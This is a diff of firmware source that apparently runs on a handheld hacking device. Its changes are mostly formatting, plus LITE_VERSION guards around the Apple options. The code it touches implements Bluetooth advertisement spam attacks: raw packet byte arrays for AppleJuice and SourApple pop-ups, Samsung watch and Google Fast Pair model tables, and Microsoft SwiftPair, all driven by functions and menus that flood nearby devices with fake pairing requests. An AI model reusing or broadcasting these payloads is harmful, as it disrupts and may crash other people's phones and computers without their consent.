@@ -41,15 +41,10 @@ struct Station {
 enum EBLEPayloadType { Microsoft, SourApple, AppleJuice, Samsung, Google };
 
 const uint8_t IOS1[] = {
-    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b,
-    0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12,
-    0x16
+    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
 };
 
-const uint8_t IOS2[] = {
-    0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27,
-    0x0b, 0x09, 0x02, 0x1e, 0x24
-};
+const uint8_t IOS2[] = {0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24};
 
 uint8_t *data;
 int deviceType = 0;
@@ -59,24 +54,15 @@ struct DeviceType {
 };
 
 const DeviceType android_models[] = {
-    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A},
-    {0x00000B}, {0x00000D}, {0x000007}, {0x090000},
-    {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE},
-    {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400},
-    {0x1E89A7}, {0xCD8256}, {0x0000F0}, {0xF00000},
-    {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0},
-    {0x92BBBD}, {0x000006}, {0x060000}, {0xD446A7},
-    {0x038B91}, {0x02F637}, {0x02D886}, {0xF00000},
-    {0xF00001}, {0xF00201}, {0xF00209}, {0xF00205},
-    {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91},
-    {0x04AFB8}, {0x05A963}, {0x05AA91}, {0x05C452},
-    {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18},
-    {0x1E955B}, {0x06AE20}, {0x06C197}, {0x06C95C},
-    {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C},
-    {0x07F426}, {0x054B2D}, {0x0660D7}, {0x0903F0},
-    {0xD99CA1}, {0x77FF67}, {0xAA187F}, {0xDCE9EA},
-    {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB},
-    {0x005EF9}, {0xE2106F}, {0xB37A62}, {0x92ADC9}
+    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x00000B}, {0x00000D}, {0x000007}, {0x090000},
+    {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE}, {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400},
+    {0x1E89A7}, {0xCD8256}, {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0},
+    {0x92BBBD}, {0x000006}, {0x060000}, {0xD446A7}, {0x038B91}, {0x02F637}, {0x02D886}, {0xF00000},
+    {0xF00001}, {0xF00201}, {0xF00209}, {0xF00205}, {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91},
+    {0x04AFB8}, {0x05A963}, {0x05AA91}, {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18},
+    {0x1E955B}, {0x06AE20}, {0x06C197}, {0x06C95C}, {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C},
+    {0x07F426}, {0x054B2D}, {0x0660D7}, {0x0903F0}, {0xD99CA1}, {0x77FF67}, {0xAA187F}, {0xDCE9EA},
+    {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB}, {0x005EF9}, {0xE2106F}, {0xB37A62}, {0x92ADC9}
 };
 
 const WatchModel watch_models[26] = {{0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08},
@@ -89,9 +75,7 @@ const char *generateRandomName() {
     const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
     int len = rand() % 10 + 1;
     if (len > 31) len = 31;
-    for (int i = 0; i < len; ++i) {
-        randomNameBuffer[i] = charset[rand() % strlen(charset)];
-    }
+    for (int i = 0; i < len; ++i) { randomNameBuffer[i] = charset[rand() % strlen(charset)]; }
     randomNameBuffer[len] = '\0';
     return randomNameBuffer;
 }
@@ -145,13 +129,10 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String 
         case AppleJuice: {
             int rand_val = random(2);
             if (rand_val == 0) {
-                uint8_t packet[26] = {
-                    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07,
-                    IOS1[random() % sizeof(IOS1)],
-                    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-                    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
-                    0x00, 0x00
-                };
+                uint8_t packet[26] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
+                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                                      0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                                      0x00, 0x00};
 #ifdef NIMBLE_V2_PLUS
                 AdvData.addData(packet, 26);
 #else
@@ -159,13 +140,10 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String 
                 AdvData.addData(dataVector);
 #endif
             } else if (rand_val == 1) {
-                uint8_t packet[23] = {
-                    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
-                    0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1,
-                    IOS2[random() % sizeof(IOS2)],
-                    0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
-                    0x00, 0x00
-                };
+                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
+                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)],
+                                      0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
+                                      0x00, 0x00};
 #ifdef NIMBLE_V2_PLUS
                 AdvData.addData(packet, 23);
 #else
@@ -204,8 +182,20 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String 
         case Samsung: {
             uint8_t model = watch_models[random(26)].value;
             uint8_t Samsung_Data[15] = {
-                0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02,
-                0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
+                0x0F,
+                0xFF,
+                0x75,
+                0x00,
+                0x01,
+                0x00,
+                0x02,
+                0x00,
+                0x01,
+                0x01,
+                0xFF,
+                0x00,
+                0x00,
+                0x43,
                 (uint8_t)((model >> 0x00) & 0xFF)
             };
 #ifdef NIMBLE_V2_PLUS
@@ -219,11 +209,20 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String 
         case Google: {
             const uint32_t model = android_models[rand() % android_models_count].value;
             uint8_t Google_Data[14] = {
-                0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C,
-                0xFE, (uint8_t)((model >> 0x10) & 0xFF),
+                0x03,
+                0x03,
+                0x2C,
+                0xFE,
+                0x06,
+                0x16,
+                0x2C,
+                0xFE,
+                (uint8_t)((model >> 0x10) & 0xFF),
                 (uint8_t)((model >> 0x08) & 0xFF),
                 (uint8_t)((model >> 0x00) & 0xFF),
-                0x02, 0x0A, (uint8_t)((rand() % 120) - 100)
+                0x02,
+                0x0A,
+                (uint8_t)((rand() % 120) - 100)
             };
 #ifdef NIMBLE_V2_PLUS
             AdvData.addData(Google_Data, 14);
@@ -366,7 +365,7 @@ void aj_adv(int ble_choice) {
 
             int protocol = count % 7;
 
-            switch(protocol) {
+            switch (protocol) {
                 case 0:
                     displayTextLine("Android " + String(count));
                     executeSpam(Google);
@@ -379,14 +378,17 @@ void aj_adv(int ble_choice) {
                     displayTextLine("Windows " + String(count));
                     executeSpam(Microsoft);
                     break;
+#if !defined(LITE_VERSION)
                 case 3:
                     displayTextLine("AppleTV " + String(count));
                     quickAppleSpam(10);
                     break;
+
                 case 4:
                     displayTextLine("AirPods " + String(count));
                     quickAppleSpam(0);
                     break;
+#endif
                 case 5:
                     displayTextLine("SourApple " + String(count));
                     executeSpam(SourApple);
@@ -419,12 +421,10 @@ void aj_adv(int ble_choice) {
 
     while (1) {
         switch (ble_choice) {
-            case 0:
-                startAppleSpam(0);
-                return;
-            case 1:
-                startAppleSpam(10);
-                return;
+#if !defined(LITE_VERSION)
+            case 0: startAppleSpam(0); return;
+            case 1: startAppleSpam(10); return;
+#endif
             case 2:
                 displayTextLine("SwiftPair  (" + String(count) + ")");
                 executeSpam(Microsoft, spamName);
@@ -478,7 +478,9 @@ void legacySubMenu() {
 
 void spamMenu() {
     std::vector<Option> options;
+#if !defined(LITE_VERSION)
     options.push_back({"Apple Spam", [=]() { appleSubMenu(); }});
+#endif
     options.push_back({"Apple Spam (Legacy)", [=]() { legacySubMenu(); }});
     options.push_back({"Windows Spam", lambdaHelper(aj_adv, 2)});
     options.push_back({"Samsung Spam", lambdaHelper(aj_adv, 3)});
